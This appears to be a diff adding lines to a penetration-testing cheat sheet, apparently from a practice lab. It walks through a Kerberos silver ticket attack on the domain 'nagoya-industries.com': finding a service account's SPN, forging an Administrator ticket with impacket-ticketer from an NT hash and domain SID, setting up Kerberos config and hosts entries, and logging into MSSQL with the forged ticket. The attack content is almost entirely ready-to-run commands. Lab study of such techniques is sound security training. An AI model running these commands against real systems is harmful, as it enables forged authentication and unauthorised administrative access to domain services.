@@ -410,12 +410,40 @@ https://codebeautify.org/ntlm-hash-generator
 
 Get SPN:
 Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+or
+Import-Module .\PowerView.ps1
+setspn -L svc_mssql
 
 Exploiting silver ticket:
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
 
 export KRB5CCNAME=$PWD/Administrator.ccache
 
+Klist to view kerberos tickets
+
+Create /etc/krb5user.conf:
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]        
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+
+/etc/hosts:
+192.168.227.21  nagoya.nagoya-industries.com
+
+impacket-mssqlclient -k nagoya.nagoya-industries.com
 ```
 #### Pass the ticket
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
